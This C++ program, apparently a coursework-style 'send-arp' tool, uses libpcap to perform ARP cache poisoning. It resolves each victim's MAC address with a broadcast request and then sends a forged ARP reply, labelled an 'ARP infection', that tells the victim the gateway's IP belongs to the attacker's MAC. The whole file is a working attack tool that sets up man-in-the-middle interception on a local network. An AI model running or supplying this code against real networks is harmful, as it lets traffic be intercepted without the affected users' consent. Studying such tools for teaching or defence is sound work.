#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <vector>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <ifaddrs.h>

// Define constant related with ARP protocol
#define ETHERTYPE_ARP 0x0806
#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arp_hdr {
    uint16_t htype; // Hardware Type
    uint16_t ptype; // Protocol Type
    uint8_t hlen;   // Hardware Address Length
    uint8_t plen;   // Protocol Address Length
    uint16_t oper;  // Operation code (Request or Response)
    uint8_t sha[6]; // Sender Hardware Address
    uint8_t spa[4]; // Sender Protocol Address
    uint8_t tha[6]; // Target Hardware Address
    uint8_t tpa[4]; // Target Protocol Address
};

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMacAddress(const char* dev, uint8_t* mac) {
    struct ifreq ifr;                               // Declare Network Interface Info Structure
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;               // set address type to ipv4
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);       // copy interface name    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {     // request MAC Address with ioctl call
        perror("ioctl");
        close(fd);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);         // copy info to mac pointer
    close(fd);
    return true;
}

bool getIPAddress(const char* dev, uint8_t* ip) {
    struct ifaddrs *ifaddr, *ifa;                           // Declare Network Interface Info Structure
    if (getifaddrs(&ifaddr) == -1) {                        // Get Network Interface's address info
        perror("getifaddrs");
        return false;
    }
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {  // Query all Network Interface
        if (ifa->ifa_addr == NULL)                          // If none address info then skip
            continue;
        // Find Whether if interface's name matches with dev and Address type is IPv4(AF_INET)
        if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_INET) {   
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            memcpy(ip, &(addr->sin_addr), 4);               // copy info to ip pointer
            freeifaddrs(ifaddr);
            return true;
        }
    }
    freeifaddrs(ifaddr);
    return false;
}

bool sendArpPacket(pcap_t* handle, const uint8_t* srcMac, const uint8_t* dstMac, 
                   uint16_t operation, const uint8_t* senderMac, const uint8_t* senderIp, 
                   const uint8_t* targetMac, const uint8_t* targetIp) {
    uint8_t packet[42];
    struct ether_header* etherHeader = (struct ether_header*)packet;                        // Set Ethernet header structure
    struct arp_hdr* arpHeader = (struct arp_hdr*)(packet + sizeof(struct ether_header));    // Set ARP header structure

    // Ethernet Header
    memcpy(etherHeader->ether_dhost, dstMac, 6);        // Destination MAC
    memcpy(etherHeader->ether_shost, srcMac, 6);        // Source MAC
    etherHeader->ether_type = htons(ETHERTYPE_ARP);     // Set ethertype to ARP

    // ARP Header
    arpHeader->htype = htons(1);                        // set hardware type = ethernet
    arpHeader->ptype = htons(0x0800);                   // set protocol type = IPv4
    arpHeader->hlen = 6;                                // set hardware address length = 6
    arpHeader->plen = 4;                                // set protocol address length = 4
    arpHeader->oper = htons(operation);                 // operation code (request or response)
    memcpy(arpHeader->sha, senderMac, 6);               // source mac addr
    memcpy(arpHeader->spa, senderIp, 4);                // source ip protocol addr
    memcpy(arpHeader->tha, targetMac, 6);               // target mAC addr
    memcpy(arpHeader->tpa, targetIp, 4);                // target ip protocol addr

    return pcap_sendpacket(handle, packet, 42) != -1;   // send packet
}

bool getMacFromArpReply(pcap_t* handle, const uint8_t* senderIp, uint8_t* senderMac) {
    struct pcap_pkthdr* header;
    const uint8_t* packet;
    int res;
    
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {           // Loop to capture packets
        if (res == 0) continue;                                             // Timeout, continue to next iteration
        
        struct ether_header* etherHeader = (struct ether_header*)packet;    // Cast packet to Ethernet header
        
        if (ntohs(etherHeader->ether_type) == ETHERTYPE_ARP) {                                   // Check if it's an ARP packet
            struct arp_hdr* arpHeader = (struct arp_hdr*)(packet + sizeof(struct ether_header)); // Cast to ARP header, skipping Ethernet header
            
            // Check if it's an ARP reply and if source IP matches the sender IP we're looking for
            if (ntohs(arpHeader->oper) == ARP_REPLY && memcmp(arpHeader->spa, senderIp, 4) == 0) {
                memcpy(senderMac, arpHeader->sha, 6);                       // Copy the sender's MAC address
                return true;                                                // MAC address found
            }
        }
    }
    
    return false;
}

bool sendArpInfection(pcap_t* handle, const uint8_t* attackerMac, const uint8_t* victimMac, 
                      const uint8_t* gatewayIp, const uint8_t* victimIp) {
    uint8_t packet[42];
    struct ether_header* etherHeader = (struct ether_header*)packet;                         // ethernet header
    struct arp_hdr* arpHeader = (struct arp_hdr*)(packet + sizeof(struct ether_header));    // arp header

    // Ethernet Header
    memcpy(etherHeader->ether_dhost, victimMac, 6);
    memcpy(etherHeader->ether_shost, attackerMac, 6);
    etherHeader->ether_type = htons(ETHERTYPE_ARP); // set ethernet type to ARP

    // ARP Header
    arpHeader->htype = htons(1);                    // Hardeware Type (Ethernet)
    arpHeader->ptype = htons(0x0800);               // Protocol Type (IPv4)
    arpHeader->hlen = 6;                            // Hardware Address Length (MAC Addr)
    arpHeader->plen = 4;                            // IP Protocol Address Length (IP Addr)
    arpHeader->oper = htons(ARP_REPLY);             // Operation Code (ARP Reply)
    memcpy(arpHeader->sha, attackerMac, 6);         // Source Hardware Address (Attacker MAC)
    memcpy(arpHeader->spa, gatewayIp, 4);           // Source IP Protocol Address (Gateway IP)
    memcpy(arpHeader->tha, victimMac, 6);           // Destination Hardware Address (Victim MAC)
    memcpy(arpHeader->tpa, victimIp, 4);            // Destination IP Protocol Address (Victim IP)

    return pcap_sendpacket(handle, packet, 42) != -1;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    // dev = device name, BUFSIZ = packet's maximum byte to capture, 1 = promiscuous, 1= set read time to 1ms, errbuf = buffer to save error
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    // Get Attacker System's IP Addr and MAC Addr
    uint8_t attackerMac[6], attackerIp[4];
    if (!getMacAddress(dev, attackerMac) || !getIPAddress(dev, attackerIp)) {
        fprintf(stderr, "Couldn't get attacker's MAC or IP address for %s\n", dev);
        return -1;
    }

    std::vector<std::pair<std::string, std::string>> ipPairs;   //Remember this program gest pairs of ip addresses
    for (int i = 2; i < argc; i += 2) {                         // argv[0] = program name, argv[1] = interface name => so start with 2
        ipPairs.push_back({argv[i], argv[i+1]});
    }

    for (const auto& pair : ipPairs) {
        uint8_t victimIp[4], gatewayIp[4], victimMac[6], broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};    // Set Broadcase Mac ADDR (Used for send packet to all Network Devices)
        inet_pton(AF_INET, pair.first.c_str(), victimIp);                                                           // Conver Ip Addr String form to Ip Addr Binary form
        inet_pton(AF_INET, pair.second.c_str(), gatewayIp);                                                         // Conver Ip Addr String form to Ip Addr Binary form

        // Get victim's MAC address
        if (!sendArpPacket(handle, attackerMac, broadcastMac, ARP_REQUEST, attackerMac, attackerIp, broadcastMac, victimIp)) {
            fprintf(stderr, "Failed to send ARP request\n");
            continue;
        }

        if (!getMacFromArpReply(handle, victimIp, victimMac)) {
            fprintf(stderr, "Couldn't get victim's MAC address\n");
            continue;
        }

        // Send ARP infection
        if (!sendArpInfection(handle, attackerMac, victimMac, gatewayIp, victimIp)) {
            fprintf(stderr, "Failed to send ARP infection\n");
            continue;
        }

        printf("Sent ARP infection to %s (MAC: %02x:%02x:%02x:%02x:%02x:%02x)\n", 
               pair.first.c_str(), victimMac[0], victimMac[1], victimMac[2], victimMac[3], victimMac[4], victimMac[5]);
    }

    pcap_close(handle);
    return 0;
}